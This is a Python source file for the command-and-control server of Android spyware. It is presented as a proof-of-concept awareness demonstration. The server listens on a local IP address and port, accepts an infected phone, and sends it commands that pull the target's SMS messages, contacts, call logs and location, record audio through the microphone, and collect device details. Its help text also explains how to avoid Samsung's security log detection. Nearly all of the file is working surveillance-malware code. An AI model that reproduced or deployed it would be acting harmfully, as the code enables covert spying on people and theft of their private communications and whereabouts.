from socket import *
import os

def print_help():

    functions = {

        "sms\t\t"       : "Reads all messages received / sent by the target, default buffer is 30720, you should increase it if needed",
        "contact\t\t"   : "Get a list of all contacts",
        "call\t\t"      : "Read call log and prints out all infos retreived (recipient, caller, duration, type), default buffer is 30720, you should increase it if needed.",
        "record\t\t"    : "Service will hook on internal microphone in order to spy conversation.\n\t\t    BEWARE Samsung phones has a special utility named 'Security Log Agent' it will detect when you enable microphone outside the app be careful with it.",
        "location\t"    : "Gets location (Latitude and Longitude) of target device",
        "intel\t\t"     : "Will gather intels about the device such as version, model, manufacturer etc...",
        "bluetooth\t"   : "Enable / Disable bluetooth on target device\n\n",
        "internet"      : "Will open a certain Youtube page...",
        "help\t\t"      : "Prints this help\n\n"
    }

    print("\n\nHi ESD !! Welcome to the demonstration, seat back and relax, we will show you how you'll get infected if you don't pay attention to your surroundings")
    print("This PoC has been developped in order to show you how easily you can get trapped.\nOn this side of the project, you're operating the Command and Control Server, here's the list of command available below : \n\n")

    for key in functions:
        
        print("{} : {}".format(key, functions[key]))

HOST = "192.168.43.45"
PORT = 666


s = socket(AF_INET, SOCK_STREAM)
s.bind((HOST, PORT))
print("[INFO] Listening on "+str(HOST)+":"+str(PORT)+" awaiting target")
s.listen(1)


while True:

    conn, addr = s.accept()
    print("[INFO] Incoming connection from target :" , addr)
    msg = conn.recv(1024)
    
    if str(msg.decode("UTF-8")) == "C2C":
        print("[INFO] Flag has been received, target is successfully infected, let's go\n")
        print_help()

        while True:

            cmd = str(input(">>> "))

            if cmd is None:

                continue

            elif cmd == "help":

                print_help()
                print("\n\n")

            else:

                if cmd == str("sms"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(30720)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))

                        except Exception as e:

                            print("[WARN] Exception caught => "+str(e))
                            continue

                elif cmd == str("call"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(30720)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))
                        
                        except Exception as e:
                            print("[WARN] Exception caught => "+str(e))
                            continue

                elif cmd == str("contact"):

                    conn.send(cmd.encode("UTF-8"))

                    while 1:

                        try:

                            msg_rp = conn.recv(16384)
                            
                            if "[FLG]" in msg_rp.decode("UTF-8"):
                            
                                print("Done receiving")
                                break
                            
                            else:
                            
                                print(msg_rp.decode("UTF-8"))
                        
                        except Exception as e:
                            print("[WARN] Exception caught => "+str(e))
                            continue

                else: 

                    try:

                        conn.send(cmd.encode("UTF-8"))
                        msg_rp = conn.recv(1024)
                        print(msg_rp.decode("UTF-8"))
                    
                    except Exception as e:

                        print("[WARN] Exception caught => "+str(e))
                        continue


    else:
        print("[WARN] Wrong/No flag has been received quiting")
        exit()